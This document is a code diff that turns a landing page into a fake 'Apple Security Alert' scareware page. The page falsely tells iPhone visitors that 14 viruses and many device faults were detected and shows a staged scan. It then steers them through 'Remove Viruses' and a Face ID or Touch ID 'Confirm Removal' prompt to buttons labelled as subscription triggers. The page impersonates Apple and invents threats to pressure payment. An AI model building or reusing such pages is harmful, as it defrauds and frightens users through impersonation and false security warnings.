@@ -1,71 +1,298 @@
 <!doctype html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="format-detection" content="telephone=no">
-  <meta name="color-scheme" content="dark light">
-  <meta name="theme-color" content="#1c1c1e">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-  <title></title>
-  <link rel="stylesheet" href="./css/styles.css">
-  <script>(function (w, d, s, l, i) {
-            w[l] = w[l] || []; w[l].push({
-                'gtm.start':
-                    new Date().getTime(), event: 'gtm.js'
-            }); var f = d.getElementsByTagName(s)[0],
-                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
-                    'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
-        })(window, document, 'script', 'dataLayer', 'GTM-WHRV45S5');</script>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
 
-  <!-- Meta Pixel Code -->
-  <script>
-  !function(f,b,e,v,n,t,s)
-  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-  n.queue=[];t=b.createElement(e);t.async=!0;
-  t.src=v;s=b.getElementsByTagName(e)[0];
-  s.parentNode.insertBefore(t,s)}(window, document,'script',
-  'https://connect.facebook.net/en_US/fbevents.js');
-  fbq('init', '636359672211566');
-  fbq('track', 'PageView');
-  </script>
-  <noscript><img height="1" width="1" style="display:none"
-  src="https://www.facebook.com/tr?id=636359672211566&ev=PageView&noscript=1"
-  alt=""
-  /></noscript>
-  <!-- End Meta Pixel Code -->
+    <meta http-equiv=" X-UA-Compatible" content="ie=edge">
+    <meta name="theme-color" content="#f8f7f9">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="css/style.css">
+    <title>Apple Security Alert</title>
 </head>
+
+<noscript>
+    <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WHRV45S5" height="0" width="0"
+        style="display:none;visibility:hidden"></iframe>
+</noscript>
+
 <body>
-  <main class="landing" data-click-area>
-    <header class="topbar">
-      <div class="brand">
-        <img class="brand__icon" src="assets/safari.svg" alt="">
-        <span class="brand__name" data-i18n="brand"></span>
-      </div>
-      <time class="current-date" data-current-date></time>
-    </header>
+    <div class="wrapper">
+        <div class="container step-one">
+            <div class="step-one__content">
+                <section class="section step-one__security">
+                    <img src="./assets/home_screen_iphone.svg" alt="Iphone home screen" class="step-one__phone" draggable="false">
+                    <h1 class="title step-one__security-title">Apple Security</h1>
+                    <p class="step-one__device">Your Device: <strong>Iphone 17 Pro</strong></p>
+                    <div class="step-one__risk">Your device is at risk.</div>
+                    <p class="step-one__description">
+                        Take immediate action to prevent data loss!<br>
+                        Start a scan to check your device for viruses!
+                    </p>
+                </section>
 
-    <section class="alert">
-      <img class="alert__icon" src="assets/warning.svg" alt="">
-      <h1 class="alert__title">
-        <span data-i18n="heroTitle"></span>
-        <span class="alert__danger" data-i18n="heroDanger"></span>
-      </h1>
-      <p class="alert__copy" data-i18n="heroCopy"></p>
-      <p class="alert__copy alert__copy--warning" data-i18n="heroWarning"></p>
+                <div class="step-one__alerts">
+                    <section class="step-one__alert">
+                        <img src="./assets/_icon_settings.svg" alt="Settings" class="step-one__alert-icon" draggable="false">
+                        <div class="step-one__alert-copy">
+                            <h2>Settings Warning!</h2>
+                            <p>14 threats detected!</p>
+                        </div>
+                        <span class="step-one__alert-count">14</span>
+                    </section>
 
-      <div class="timer-card">
-        <div class="timer" data-countdown></div>
-        <p class="timer-card__copy" data-i18n="timerCopy"></p>
-      </div>
+                    <section class="step-one__alert">
+                        <img src="./assets/_icon_apple.svg" alt="AppleCare" class="step-one__alert-icon" draggable="false">
+                        <div class="step-one__alert-copy">
+                            <h2>AppleCare Warning!</h2>
+                            <p>16 threats detected!</p>
+                        </div>
+                        <span class="step-one__alert-count">16</span>
+                    </section>
+                </div>
+            </div>
+            <footer class="step-one__footer">
+                <p class="text-uppercase">POTENTIAL MALWARE INFECTION</p>
+                <button class="scan-button step-one__scan-button" id="start-scan-button">Start Scan</button>
+            </footer>
+        </div>
 
-    </section>
+        <div class="container step-two">
+            <div class="step-two__content">
+                <div class="step-two__top-content">
+                    <h2 class="step-one__page-title">Device Security</h2>
+                    <section class="section step-one__security">
+                        <div class="settings-icon-wrapper" data-count="0">
+                            <img src="./assets/settings-icon.svg" alt="Settings" class="settings-icon" draggable="false">
+                        </div>
+                        <h1 class="title">Apple Security</h1>
+                        <hr class="step-one__divider">
+                        <p class="step-one__description">Scanning in progress...</p>
 
-    <a class="cta" href="{offer}" data-offer-link data-i18n="cta"></a>
-  </main>
+                        <progress id="progress-bar" max="100" value="0">0%</progress>
+                    </section>
+                </div>
 
-  <script src="./js/app.js"></script>
+                <div class="step-two__detected-btn">Detected issues:&nbsp;<span id="detected-issues-count"> 0</span>
+                </div>
+
+                <table class="threats-table">
+                    <thead>
+                        <tr>
+                            <th>Code</th>
+                            <th>Process</th>
+                            <th>Message</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>123223</td>
+                            <td class="detected">Detected</td>
+                            <td>App Crashed</td>
+                        </tr>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>484838</td>
+                            <td class="detected">Detected</td>
+                            <td>Slow Charging</td>
+                        </tr>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>394393</td>
+                            <td class="detected">Detected</td>
+                            <td>Battery Overheating</td>
+                        </tr>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>383833</td>
+                            <td class="detected">Detected</td>
+                            <td>Corrupted Photos</td>
+                        </tr>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>323233</td>
+                            <td class="detected">Detected</td>
+                            <td>Memory Critical</td>
+                        </tr>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>323255</td>
+                            <td class="detected">Detected</td>
+                            <td>No Internet Access</td>
+                        </tr>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>504943</td>
+                            <td class="detected">Detected</td>
+                            <td>SIM Card Not Found</td>
+                        </tr>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>584747</td>
+                            <td class="detected">Detected</td>
+                            <td>Contacts Disappeared</td>
+                        </tr>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>573647</td>
+                            <td class="detected">Detected</td>
+                            <td>Display Glitch</td>
+                        </tr>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>595843</td>
+                            <td class="detected">Detected</td>
+                            <td>High CPU Usage</td>
+                        </tr>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>584747</td>
+                            <td class="detected">Detected</td>
+                            <td>Update Required</td>
+                        </tr>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>094837</td>
+                            <td class="detected">Detected</td>
+                            <td>Data Loss Warning</td>
+                        </tr>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>002384</td>
+                            <td class="detected">Detected</td>
+                            <td>Audio Problem</td>
+                        </tr>
+                        <tr style="opacity: 0; transition: opacity 0.1s ease-in;">
+                            <td>349483</td>
+                            <td class="detected">Detected</td>
+                            <td>Lock Screen Not Responding</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="container step-three">
+            <div class="step-two__content">
+                <div class="step-two__top-content">
+                    <h2 class="step-one__page-title">Device Security</h2>
+                    <section class="section step-one__security">
+                        <img src="./assets/phone.svg" alt="Settings" class="settings-icon" draggable="false">
+                        <h1 class="title">Malware Detected</h1>
+                        <hr class="step-one__divider">
+                        <p class="note"><span>14</span> viruses found</p>
+                    </section>
+
+                    <ul class="step-three__apps">
+                        <li class="step-three__apps-item">
+                            <div>
+                                <img src="./assets/Battery.svg" alt="Application Icon" class="app-icon" draggable="false">
+                                <span class="app-name">Battery Overheating</span>
+                            </div>
+                            <span class="app-level">High</span>
+                        </li>
+                        <div class="step-three__apps-divider"></div>
+                        <li class="step-three__apps-item">
+                            <div>
+                                <img src="./assets/Photos.svg" alt="Application Icon" class="app-icon" draggable="false">
+                                <span class="app-name">Loss of Photos</span>
+                            </div>
+                            <span class="app-level">High</span>
+                        </li>
+                        <div class="step-three__apps-divider"></div>
+                        <li class="step-three__apps-item">
+                            <div>
+                                <img src="./assets/Contacts.svg" alt="Application Icon" class="app-icon" draggable="false">
+                                <span class="app-name">Loss of Contacts</span>
+                            </div>
+                            <span class="app-level">High</span>
+                        </li>
+                        <div class="step-three__apps-divider"></div>
+                        <li class="step-three__apps-item">
+                            <div>
+                                <img src="./assets/SIM.svg" alt="Application Icon" class="app-icon" draggable="false">
+                                <span class="app-name">SIM card damage</span>
+                            </div>
+                            <span class="app-level">High</span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+
+            <footer class="step-one__footer">
+                <div class="step-one__footer-warning">
+                    <img src="./assets/warning-icon.svg" alt="Warning Icon" class="warning-icon-footer" draggable="false">
+                    <p class="warning-text">Action Required: remove 14 viruses</p>
+                </div>
+                <button class="scan-button" id="remove-viruses-btn">Remove Viruses</button>
+            </footer>
+
+            <div class="step-three__overlay">
+                <div class="step-three__notification step-three__notification--settings">
+                    <img src="./assets/settings-icon.svg" alt="Settings Icon" class="step-three__notification-icon" draggable="false">
+                    <div class="step-three__notification-content">
+                        <div class="step-three__notification-header">
+                            <p>Settings</p>
+                            <span>now</span>
+                        </div>
+                        <p class="step-three__notification-note">You need to protect your phone!</p>
+                    </div>
+                </div>
+
+                <div class="step-three__notification step-three__notification--unsuccessful">
+                    <img src="./assets/appstore-icon.svg" alt="Settings Icon" class="step-three__notification-icon" draggable="false">
+                    <div class="step-three__notification-content">
+                        <div class="step-three__notification-header">
+                            <p>Unsuccessful cleaning</p>
+                            <span>now</span>
+                        </div>
+                        <p class="unsuccessful-note">Your device is still not protected!</p>
+                    </div>
+                </div>
+
+                <div class="step-three__popup step-three__popup--confirm">
+                    <div class="step-three__popup-wrapper">
+                        <h1 class="step-three__popup-title">Confirm Removal</h1>
+                        <p class="step-three__popup-message">
+                            Please use Face ID or Touch ID to confirm virus removal
+                        </p>
+                    </div>
+                    <button class="step-three__popup-btns" id="subscribe-confirm-btn">
+                        <span>Continue</span>
+                        <div class="step-three__popup-spinner">
+                            <div class="spinner">
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                            </div>
+                        </div>
+                    </button>
+                </div>
+
+                <div class="step-three__popup step-three__popup--risk">
+                    <div class="step-three__popup-wrapper">
+                        <h1 class="step-three__popup-title">Your device is still at risk!</h1>
+                        <p class="step-three__popup-message">
+                            It is recommended to protect your phone immediately!
+                        </p>
+                    </div>
+                    <button class="step-three__popup-btns" id="subscribe-risk-btn">
+                        <span>Continue</span>
+                        <div class="step-three__popup-spinner">
+                            <div class="spinner">
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                                <div class="spinner-blade"></div>
+                            </div>
+                        </div>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/main.js"></script>
 </body>
+
 </html>
